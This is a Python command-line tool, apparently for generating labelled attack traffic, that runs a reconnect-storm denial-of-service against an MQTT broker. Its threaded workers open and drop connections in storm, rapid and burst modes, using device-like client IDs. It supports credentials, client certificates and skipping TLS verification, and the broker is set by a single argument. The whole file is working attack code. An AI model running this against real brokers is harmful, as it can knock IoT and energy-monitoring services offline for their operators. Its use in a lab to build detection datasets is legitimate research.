#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import json
import time
import threading
import random
import argparse
import ssl
import os
from datetime import datetime, timezone

def make_client_id(device_base: str, index: int,
                   prefix: str = "energy-", suffix: str = "replayer",
                   sep: str = "-") -> str:
    device = str(device_base).strip().replace(" ", "_")
    idx = int(index)
    return f"{prefix}{device}{idx}{sep}{suffix}"

class ReconnectStormAttackTLS:
    def __init__(self, broker_host="localhost", broker_port=8883,
                 ca_certs=None, client_cert=None, client_key=None, insecure=False,
                 use_tls: bool | None = None):
        self.broker_host = broker_host
        self.broker_port = broker_port
        self.ca_certs = ca_certs
        self.client_cert = client_cert
        self.client_key = client_key
        self.insecure = insecure

        # decide TLS usage: explicit override or auto (port-based)
        if use_tls is None:
            self.use_tls = True if broker_port in (8883, 8884) else False
        else:
            self.use_tls = bool(use_tls)

        self.attack_stats = {
            "reconnect_attempts": 0,
            "connections_successful": 0,
            "connections_failed": 0,
            "disconnections": 0,
            "messages_sent": 0,
            "start_time": None,
            "end_time": None
        }

        self.fallback_device_types = ["sensor_cooler", "sensor_fanspeed", "sensor_motion"]

    def _print_cert_status(self):
        print(" TLS configuration:")
        print(f"  Broker: {self.broker_host}:{self.broker_port}")
        print(f"  TLS enabled: {self.use_tls}")
        if not self.use_tls:
            print("=" * 60)
            return
        print(f"  Using CA file: {self.ca_certs or 'None'} -> {'FOUND' if (self.ca_certs and os.path.exists(self.ca_certs)) else 'MISSING or using system CA'}")
        print(f"  Client cert: {self.client_cert or 'None'} -> {'FOUND' if (self.client_cert and os.path.exists(self.client_cert)) else 'MISSING'}")
        print(f"  Client key : {self.client_key or 'None'} -> {'FOUND' if (self.client_key and os.path.exists(self.client_key)) else 'MISSING'}")
        print(f"  Insecure mode (skip verification): {self.insecure}")
        print("=" * 60)

    def create_client(self, client_id, username=None, password=None):
        try:
            client = mqtt.Client(client_id=client_id, protocol=mqtt.MQTTv311)

            # If TLS is disabled, return plain client (username/password can still be set)
            if not self.use_tls:
                if username and password:
                    client.username_pw_set(username, password)
                return client

            # TLS enabled: use provided CA if available, otherwise create context
            if self.ca_certs and os.path.exists(self.ca_certs):
                client.tls_set(
                    ca_certs=self.ca_certs,
                    certfile=self.client_cert if (self.client_cert and os.path.exists(self.client_cert)) else None,
                    keyfile=self.client_key if (self.client_key and os.path.exists(self.client_key)) else None,
                    cert_reqs=ssl.CERT_REQUIRED,
                    tls_version=ssl.PROTOCOL_TLS_CLIENT,
                    ciphers=None
                )
            else:
                ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
                # load client cert/key if provided
                if self.client_cert and self.client_key and os.path.exists(self.client_cert) and os.path.exists(self.client_key):
                    try:
                        ctx.load_cert_chain(certfile=self.client_cert, keyfile=self.client_key)
                    except Exception as e:
                        print(f"  Warning: failed to load client cert/key: {e}")
                if self.insecure:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                client.tls_set_context(ctx)

            if self.insecure:
                try:
                    client.tls_insecure_set(True)
                except Exception:
                    pass

            if username and password:
                client.username_pw_set(username, password)

            return client
        except Exception as e:
            print(f" Error creating client {client_id}: {e}")
            return None

    def _get_client_id_for_reconnect(self, worker_id: int, reconnect_index: int):
        device_base = self.fallback_device_types[worker_id % len(self.fallback_device_types)]
        idx = worker_id * 10000 + (reconnect_index + 1)
        return make_client_id(device_base, idx)

    def reconnect_storm_worker(self, worker_id, num_reconnects=50, min_delay_ms=10, max_delay_ms=100, username=None, password=None):
        print(f" Worker {worker_id}: Starting reconnect storm attack...")
        for reconnect in range(num_reconnects):
            try:
                client_id = self._get_client_id_for_reconnect(worker_id, reconnect)
                client = self.create_client(client_id, username, password)

                if not client:
                    self.attack_stats["connections_failed"] += 1
                    continue

                def on_connect(client_obj, userdata, flags, rc):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        if reconnect % 10 == 0:
                            print(f" Worker {worker_id} ({client_id}): Reconnect {reconnect+1} successful")
                        # publish a few short messages to indicate connection
                        for i in range(3):
                            try:
                                payload = {
                                    "timestamp": datetime.now(timezone.utc).isoformat(),
                                    "packet_type": "CONNECT",
                                    "client_id": client_id,
                                    "src_ip": "127.0.0.1",
                                    "attack_signature": "R9_CONNECT_RETRY_STORM",
                                    "worker_id": worker_id,
                                    "reconnect_id": reconnect + 1,
                                    "message_id": i,
                                    "keepalive": 60,
                                    "storm_data": "S" * random.randint(20, 120)
                                }
                                info = client_obj.publish("test/reconnect", json.dumps(payload), qos=0)
                                if getattr(info, "rc", 1) == 0:
                                    self.attack_stats["messages_sent"] += 1
                            except Exception:
                                pass
                        time.sleep(random.uniform(0.05, 0.2))
                    else:
                        self.attack_stats["connections_failed"] += 1

                def on_disconnect(client_obj, userdata, rc):
                    self.attack_stats["disconnections"] += 1

                client.on_connect = on_connect
                client.on_disconnect = on_disconnect

                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()

                self.attack_stats["reconnect_attempts"] += 1

                # short active period then disconnect
                time.sleep(random.uniform(0.05, 0.2))

                client.loop_stop()
                client.disconnect()

                time.sleep(random.uniform(min_delay_ms, max_delay_ms) / 1000.0)

            except Exception as e:
                self.attack_stats["connections_failed"] += 1
                if reconnect % 10 == 0:
                    print(f" Worker {worker_id}: Error in reconnect {reconnect+1}: {e}")

        print(f" Worker {worker_id}: Completed reconnect storm attack")

    def rapid_reconnect_worker(self, worker_id, duration_seconds=30, reconnect_interval_ms=50, username=None, password=None):
        print(f" Worker {worker_id}: Starting rapid reconnect attack...")
        start_time = time.time()
        reconnect_count = 0
        while time.time() - start_time < duration_seconds:
            try:
                client_id = self._get_client_id_for_reconnect(worker_id, reconnect_count)
                client = self.create_client(client_id, username, password)

                if not client:
                    self.attack_stats["connections_failed"] += 1
                    reconnect_count += 1
                    continue

                def on_connect(client_obj, userdata, flags, rc):
                    if rc == 0:
                        self.attack_stats["connections_successful"] += 1
                        if reconnect_count % 20 == 0:
                            print(f" Worker {worker_id} ({client_id}): Rapid reconnect {reconnect_count+1} successful")
                    else:
                        self.attack_stats["connections_failed"] += 1

                def on_disconnect(client_obj, userdata, rc):
                    self.attack_stats["disconnections"] += 1

                client.on_connect = on_connect
                client.on_disconnect = on_disconnect

                client.connect(self.broker_host, self.broker_port, 60)
                client.loop_start()

                self.attack_stats["reconnect_attempts"] += 1
                reconnect_count += 1

                time.sleep(0.02)

                client.loop_stop()
                client.disconnect()
                time.sleep(reconnect_interval_ms / 1000.0)

            except Exception as e:
                self.attack_stats["connections_failed"] += 1
                if reconnect_count % 20 == 0:
                    print(f" Worker {worker_id}: Error in rapid reconnect {reconnect_count+1}: {e}")
                reconnect_count += 1

        print(f" Worker {worker_id}: Completed rapid reconnect attack")

    def burst_reconnect_worker(self, worker_id, burst_size=20, burst_interval_ms=1000, num_bursts=10, username=None, password=None):
        print(f" Worker {worker_id}: Starting burst reconnect attack...")
        for burst in range(num_bursts):
            clients = []
            for i in range(burst_size):
                try:
                    reconnect_index = burst * burst_size + i
                    client_id = self._get_client_id_for_reconnect(worker_id, reconnect_index)
                    client = self.create_client(client_id, username, password)
                    if client:
                        clients.append((client_id, client))
                except Exception:
                    self.attack_stats["connections_failed"] += 1

            for client_id, client in clients:
                try:
                    def on_connect(client_obj, userdata, flags, rc):
                        if rc == 0:
                            self.attack_stats["connections_successful"] += 1
                        else:
                            self.attack_stats["connections_failed"] += 1

                    def on_disconnect(client_obj, userdata, rc):
                        self.attack_stats["disconnections"] += 1

                    client.on_connect = on_connect
                    client.on_disconnect = on_disconnect

                    client.connect(self.broker_host, self.broker_port, 60)
                    client.loop_start()
                    self.attack_stats["reconnect_attempts"] += 1
                except Exception:
                    self.attack_stats["connections_failed"] += 1

            time.sleep(0.2)

            for client_id, client in clients:
                try:
                    client.loop_stop()
                    client.disconnect()
                except Exception:
                    pass

            if burst < num_bursts - 1:
                time.sleep(burst_interval_ms / 1000.0)

        print(f" Worker {worker_id}: Completed burst reconnect attack")

    def launch_attack(self, attack_type="storm", num_workers=3, num_reconnects=50,
                     min_delay_ms=10, max_delay_ms=100, duration_seconds=30,
                     reconnect_interval_ms=50, burst_size=20, burst_interval_ms=1000,
                     num_bursts=10, username=None, password=None):
        print(f" Starting Reconnect Storm Attack")
        print(f"   Attack type: {attack_type}")
        print(f"   Workers: {num_workers}")
        print(f"   Reconnects per worker: {num_reconnects}")
        print(f"   Delay range: {min_delay_ms}-{max_delay_ms}ms")
        print(f"   Broker: {self.broker_host}:{self.broker_port}")
        self._print_cert_status()

        self.attack_stats["start_time"] = time.time()
        threads = []

        if attack_type == "rapid":
            for i in range(num_workers):
                threads.append(threading.Thread(
                    target=self.rapid_reconnect_worker,
                    args=(i, duration_seconds, reconnect_interval_ms, username, password)
                ))
        elif attack_type == "burst":
            for i in range(num_workers):
                threads.append(threading.Thread(
                    target=self.burst_reconnect_worker,
                    args=(i, burst_size, burst_interval_ms, num_bursts, username, password)
                ))
        else:
            for i in range(num_workers):
                threads.append(threading.Thread(
                    target=self.reconnect_storm_worker,
                    args=(i, num_reconnects, min_delay_ms, max_delay_ms, username, password)
                ))

        for t in threads:
            t.start()

        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("\n  Attack stopped by user")

        self.attack_stats["end_time"] = time.time()
        self.print_attack_stats()

    def print_attack_stats(self):
        duration = (self.attack_stats["end_time"] - self.attack_stats["start_time"]) if self.attack_stats["end_time"] and self.attack_stats["start_time"] else 0
        print("\n Attack Statistics:")
        print("=" * 40)
        print(f"Duration: {duration:.2f} seconds")
        print(f"Reconnect attempts: {self.attack_stats['reconnect_attempts']}")
        print(f"Connections successful: {self.attack_stats['connections_successful']}")
        print(f"Connections failed: {self.attack_stats['connections_failed']}")
        print(f"Disconnections: {self.attack_stats['disconnections']}")
        print(f"Messages sent: {self.attack_stats['messages_sent']}")
        if self.attack_stats['reconnect_attempts'] > 0:
            rate = (self.attack_stats['connections_successful'] / self.attack_stats['reconnect_attempts'] * 100)
            print(f"Connection success rate: {rate:.1f}%")
        if duration > 0:
            print(f"Reconnects per second: {self.attack_stats['reconnect_attempts']/duration:.1f}")

def main():
    parser = argparse.ArgumentParser(description="MQTT Reconnect Storm Attack (TLS)")
    parser.add_argument("--broker", default="localhost", help="MQTT broker host")
    parser.add_argument("--port", type=int, default=8883, help="MQTT broker port")
    parser.add_argument("--type", choices=["storm", "rapid", "burst"], default="storm", help="Attack type")
    parser.add_argument("--workers", type=int, default=3, help="Number of worker threads")
    parser.add_argument("--reconnects", type=int, default=50, help="Reconnects per worker")
    parser.add_argument("--min-delay", type=int, default=10, help="Minimum delay (ms)")
    parser.add_argument("--max-delay", type=int, default=100, help="Maximum delay (ms)")
    parser.add_argument("--duration", type=int, default=30, help="Duration for rapid attack (s)")
    parser.add_argument("--interval", type=int, default=50, help="Interval for rapid attack (ms)")
    parser.add_argument("--burst-size", type=int, default=20, help="Burst size")
    parser.add_argument("--burst-interval", type=int, default=1000, help="Interval between bursts (ms)")
    parser.add_argument("--num-bursts", type=int, default=10, help="Number of bursts")
    parser.add_argument("--username", help="MQTT username for authentication")
    parser.add_argument("--password", help="MQTT password for authentication")

    # TLS/CA options (added)
    parser.add_argument("--ca", help="Path to CA certificate file (PEM) to validate broker certificate")
    parser.add_argument("--client-cert", help="Path to client certificate (PEM) for mutual TLS")
    parser.add_argument("--client-key", help="Path to client private key (PEM) for mutual TLS")
    parser.add_argument("--insecure", action="store_true", help="Skip TLS certificate validation (testing only)")
    parser.add_argument("--no-tls", action="store_true", help="Force plain TCP (no TLS)")
    parser.add_argument("--tls", action="store_true", help="Force TLS even on default plaintext ports")

    args = parser.parse_args()

    # Determine TLS usage
    if args.no_tls:
        use_tls = False
    elif args.tls:
        use_tls = True
    else:
        use_tls = True if args.port in (8883, 8884) else False

    attack = ReconnectStormAttackTLS(
        broker_host=args.broker,
        broker_port=args.port,
        ca_certs=args.ca,
        client_cert=args.client_cert,
        client_key=args.client_key,
        insecure=args.insecure,
        use_tls=use_tls
    )

    attack.launch_attack(
        attack_type=args.type,
        num_workers=args.workers,
        num_reconnects=args.reconnects,
        min_delay_ms=args.min_delay,
        max_delay_ms=args.max_delay,
        duration_seconds=args.duration,
        reconnect_interval_ms=args.interval,
        burst_size=args.burst_size,
        burst_interval_ms=args.burst_interval,
        num_bursts=args.num_bursts,
        username=args.username,
        password=args.password
    )

if __name__ == "__main__":
    main()
